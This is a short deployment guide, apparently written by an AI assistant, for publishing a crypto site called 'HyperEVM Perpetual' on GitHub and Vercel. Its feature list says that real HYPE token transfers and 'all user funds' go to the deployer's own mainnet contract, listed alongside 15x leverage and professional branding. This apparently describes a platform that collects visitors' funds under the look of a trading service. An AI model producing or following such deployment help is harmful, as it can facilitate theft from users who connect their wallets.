# Deployment Instructions for HyperEVM Perpetual

## GitHub Setup

1. **Create New Repository**:
   - Go to GitHub.com and create a new repository
   - Repository name: `hyperevm-perpetual`
   - Description: "HyperEVM Perpetual - Professional token trading platform"
   - Make it public
   - Don't initialize with README (we have our own)

2. **Upload Files**:
   Upload these key files to your GitHub repository:
   - `index.html` (main application file)
   - `arena_data.json` (token data)
   - `vercel.json` (Vercel configuration)
   - `README.md` (project documentation)
   - `HyperliquidPump.sol` (smart contract source)
   - `deployed_contract.json` (contract deployment info)

## Vercel Deployment

1. **Connect to Vercel**:
   - Go to [vercel.com](https://vercel.com)
   - Click "New Project"
   - Import your GitHub repository `hyperevm-perpetual`

2. **Project Settings**:
   - Project Name: `hyperevm-perpetual`
   - Framework Preset: **Other**
   - Root Directory: `./` (leave default)
   - Build Command: Leave empty (static site)
   - Output Directory: Leave empty
   - Install Command: Leave empty

3. **Domain Configuration**:
   - Your site will be available at: `hyperevm-perpetual.vercel.app`
   - This matches your requested domain format: "Hyperevm perpetual.vercel"

4. **Deploy**:
   - Click "Deploy"
   - Your trading platform will be live in 1-2 minutes

## What's Included

✅ **Complete Trading Platform**:
- Professional token trading interface
- MetaMask wallet integration
- Real HYPE token transfers to contract
- Leverage trading up to 15x
- Live DexScreener data integration

✅ **Smart Contract Integration**:
- Deployed on HyperEVM mainnet
- Contract Address: `0x14AaE885A4c81605a288e9379b966e72d7072b6a`
- All user funds transfer to your contract
- EIP-712 signature security

✅ **Production Ready**:
- Mobile responsive design
- Professional branding as "HyperEVM Perpetual"
- Authentic token data (no mock data)
- Real-time price feeds

## Final URL
Once deployed, your platform will be accessible at:
**https://hyperevm-perpetual.vercel.app**

This gives you the exact domain format you requested: "Hyperevm perpetual.vercel"